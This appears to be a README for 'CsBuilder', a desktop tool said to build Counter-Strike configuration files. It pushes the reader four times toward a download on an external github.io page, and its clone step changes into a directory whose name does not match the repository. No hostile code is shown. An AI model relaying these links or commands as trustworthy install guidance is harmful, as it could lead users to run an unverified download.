# CsBuilder - Configuration Builder 2026

> **A modern desktop tool for visually building custom Counter-Strike configuration files (autoexec.cfg) across CS2, CSS, and CS 1.6 without writing code.**

[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/pross70/csbuilder-win-45871?style=flat-square)](https://github.com/pross70/csbuilder-win-45871)

---

<p align="center">
  <a href="https://pross70.github.io/csbuilder-win-45871/">
    <img src="https://img.shields.io/badge/Download-CsBuilder%20Latest-brightgreen?style=for-the-badge" alt="Download CsBuilder">
  </a>
</p>

> **[Direct Download - CsBuilder v1.0](https://pross70.github.io/csbuilder-win-45871/)**

---

[Download Latest Build](https://pross70.github.io/csbuilder-win-45871/)

---

## About CsBuilder

CsBuilder transforms the way Counter-Strike players create their configuration files. Instead of manually editing text files and memorizing console commands, this desktop application provides a visual interface where every setting from crosshair style to key bindings can be adjusted with simple clicks and sliders. The tool eliminates the guesswork from building an autoexec.cfg, making it accessible to newcomers while offering the depth experienced players expect.

Built with Electron and a modern dark theme interface, CsBuilder supports three major Counter-Strike titles: CS2, Counter-Strike: Source, and Counter-Strike 1.6. The application handles version-specific syntax differences automatically, so your configuration works correctly regardless of which game you play. Whether you need a competitive setup with precise crosshair adjustments or a practice environment with custom aliases, CsBuilder provides the building blocks in an intuitive package.

---

## Features

- **Multi-Game Support** — Create configurations for CS2, CSS, and CS 1.6 with automatic syntax handling for each version
- **Advanced Crosshair Editor** — Adjust every parameter including gap, thickness, outline, dot, and color with live preview
- **Built-in eDPI Calculator** — Convert sensitivity and DPI values to find your exact effective dots per inch
- **Sensitivity Converter** — Translate your mouse sensitivity between different Counter-Strike titles
- **Key Bind Manager** — Assign actions, weapons, and utilities to any key with visual mapping
- **Ready-to-Use Aliases** — Access a library of pre-built aliases for bhopping, grenade throws, and practice routines
- **Practice Mode Generator** — Build training configurations with bot setups, infinite ammo, and fly mode
- **Live CFG Preview** — See your configuration file update in real time as you make changes
- **Import/Export System** — Load existing CFG files or share your creations with the community
- **Preset System** — Save and switch between multiple configuration profiles for different play styles

---

## Installation

Clone the repository or download the latest release:

```bash
git clone https://github.com/pross70/csbuilder-win-45871.git
cd CsBuilder-cfg-builder
```

For the standalone desktop app, download the appropriate package for your operating system from the [releases page](https://pross70.github.io/csbuilder-win-45871/). No additional dependencies are required for the pre-built version.

To run from source:

```bash
npm install
npm start
```

---

## Usage

Launch CsBuilder and you will see the main dashboard with five primary sections: Crosshair, Sensitivity, Key Binds, Aliases, and Practice Mode.

**Creating a basic configuration:**

1. Select your target game (CS2, CSS, or CS 1.6) from the dropdown at the top
2. Navigate to the Crosshair tab and adjust settings using the visual sliders
3. Open the Sensitivity section to set your mouse DPI and in-game sensitivity
4. Use Key Binds to assign actions like jump, crouch, or weapon switching
5. Click "Generate CFG" to compile your settings into a ready-to-use autoexec.cfg
6. Save the file to your Counter-Strike configuration folder

**Using the sensitivity converter:**

```bash
# Example: Convert CS2 sensitivity to CS 1.6
Input: 2.5 @ 800 DPI (CS2)
Output: 3.2 @ 800 DPI (CS 1.6)
```

---

## Configuration

All settings are stored in a local JSON file within the application's user data directory. You can export your entire configuration as a standalone CFG file at any time.

Default configuration location:
- Windows: `%APPDATA%/CsBuilder/config.json`
- macOS: `~/Library/Application Support/CsBuilder/config.json`
- Linux: `~/.config/CsBuilder/config.json`

Presets are saved as separate JSON files and can be imported or exported for sharing.

---

## Requirements

- **Operating System:** Windows 10+, macOS 10.15+, or Linux (modern distributions)
- **Runtime:** Electron-based standalone app (no browser required)
- **Storage:** Approximately 100 MB for the application
- **Display:** 1280x720 minimum resolution recommended
- **Memory:** 512 MB RAM minimum

---

## FAQ

**Q: Does CsBuilder support Counter-Strike 2?**  
A: Yes, CS2 is fully supported along with Counter-Strike: Source and Counter-Strike 1.6.

**Q: Can I use my existing autoexec.cfg with this tool?**  
A: Yes, you can import existing CFG files and edit them visually using the import feature.

**Q: How do I update the application?**  
A: Check the [releases page](https://pross70.github.io/csbuilder-win-45871/) for new versions. The application will notify you when updates are available.

**Q: Where should I place my generated autoexec.cfg?**  
A: For CS2, place the file in `steamapps/common/Counter-Strike Global Offensive/game/csgo/cfg/`. For other titles, refer to their respective configuration directories.

**Q: Can I use CsBuilder offline?**  
A: Yes, the application works entirely offline after installation. No internet connection is required for configuration creation.

**Q: How do I reset my settings to default?**  
A: Delete the config.json file from the application data directory, or use the "Reset to Defaults" option in the settings menu.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
